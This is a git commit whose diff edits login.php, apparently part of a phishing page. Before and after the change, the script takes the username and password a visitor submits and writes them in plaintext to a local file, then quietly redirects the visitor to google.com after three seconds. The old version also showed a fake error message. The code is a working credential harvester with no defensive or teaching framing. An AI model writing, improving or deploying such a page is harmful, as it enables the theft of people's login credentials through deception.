62a3906e07ca77b393138e7d7e6c8200ebcd8092
evangelinejohanna <evajo812@gmail.com>
2025-04-25 09:28:01 +0530

    made updations

--- login.php
+++ login.php
@@ -1,20 +1,22 @@
 <?php
+
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $username = $_POST["username"];
-    $password = $_POST["password"];
+  $username = $_POST["username"];
+  $password = $_POST["password"];
 
-    // Store credentials in a file
-    $file = fopen("credentials.txt", "a");
-    fwrite($file, "Username: $username | Password: $password\n");
-    fclose($file);
+  $file = fopen("file.txt", "a");
+  fwrite($file, "username: $username \t password:$password");
+  fclose($file);
 
-    // Show message and redirect after 3 seconds
-    echo "<script>
-    alert('Something is wrong...Try again later');
-    setTimeout(function() {
-      window.location.href = 'https://www.google.com';
-    }, 3000);
-  </script>";
+  echo "<script>
 
-    exit();
+        setTimeout(function(){
+
+            window.location.href='https://www.google.com';
+        
+        },3000)
+        
+        </script>";
+
+  exit();
 }
